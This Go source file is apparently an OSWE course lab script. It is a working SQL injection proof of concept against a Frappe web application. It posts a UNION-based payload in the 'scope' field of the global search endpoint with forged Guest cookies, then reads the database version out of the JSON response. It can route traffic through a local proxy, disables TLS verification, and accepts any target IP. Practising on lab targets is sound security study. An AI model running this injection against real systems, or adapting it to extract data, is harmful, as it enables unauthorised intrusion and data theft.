package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"github.com/tidwall/gjson"
	"log"
	"net/http"
	"net/url"
	"os"

	"github.com/iPhantasmic/OSWE/scripts/utils"
)

// Chp 8.3.1 - Discovering the SQLi (get SQL version)

var client *http.Client

const proxyURL = "http://127.0.0.1:8080"

func getSQLVersion(debug bool, ip string) bool {
	requestURL := fmt.Sprintf("http://%s:8000/", ip)

	data := url.Values{
		"cmd":   {"frappe.utils.global_search.web_search"},
		"text":  {"offsec"},
		"scope": {"offsec_scope\" UNION ALL SELECT 1,2,3,4,@@version#"},
	}

	request := utils.PostRequest{
		ContentType: "form",
		Cookies: []*http.Cookie{
			{
				Name:  "system_user",
				Value: "yes",
			},
			{
				Name:  "full_name",
				Value: "Guest",
			},
			{
				Name:  "sid",
				Value: "Guest",
			},
			{
				Name:  "user_id",
				Value: "Guest",
			},
		},
		FormData: data,
	}

	response := utils.SendPostRequest(client, debug, requestURL, request)

	if response.StatusCode != 200 {
		return false
	}

	json := response.ResponseBody
	version := gjson.Get(json, "message.0.route")
	utils.PrintSuccess("SQL Version: " + version.String())

	return true
}

func main() {
	var tr *http.Transport
	useProxy := flag.Bool("proxy", false, "use proxy")
	debug := flag.Bool("debug", false, "debug mode")
	flag.Parse()
	// parse args
	args := os.Args[:]
	log.Println("Args: ", args)

	if len(args) < 2 {
		utils.PrintFailure(fmt.Sprintf("usage: %s [-debug=true] [-proxy=true] <target>", os.Args[0]))
		utils.PrintFailure(fmt.Sprintf("eg: %s 192.168.197.123", os.Args[0]))
		os.Exit(1)
	}

	ip := flag.Arg(0)

	if *useProxy {
		// disable TLS verification and set proxy URL
		proxyUrl, _ := url.Parse(proxyURL)
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
			Proxy:              http.ProxyURL(proxyUrl),
		}
	} else {
		tr = &http.Transport{
			TLSClientConfig:    &tls.Config{InsecureSkipVerify: true},
			DisableCompression: true, // to ensure that we can obtain Content-Length response header
		}
	}

	// create our HTTP client using the above transport and set the global variable
	client = &http.Client{
		Transport: tr,
	}

	if getSQLVersion(*debug, ip) {
		utils.PrintSuccess("Done!")
	} else {
		utils.PrintFailure("Failed to get SQL version!")
	}
}
